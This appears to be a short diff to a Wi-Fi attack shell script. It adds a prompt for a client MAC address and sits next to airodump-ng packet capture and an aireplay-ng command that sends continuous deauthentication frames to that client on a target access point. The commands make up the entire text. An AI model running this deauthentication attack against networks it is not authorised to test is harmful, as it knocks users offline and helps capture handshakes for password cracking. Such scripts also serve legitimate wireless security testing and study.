@@ -28,6 +28,8 @@ airodump-ng -w packet -c $channel -d $bssid wlan0mon
 
 qterminal
 #in a new terminal
+echo "Enter client mac address :: "
+read client
 
 aireplay-ng -c $client -a $bssid -0 0 wlan0mon
 # -c is the client mac address
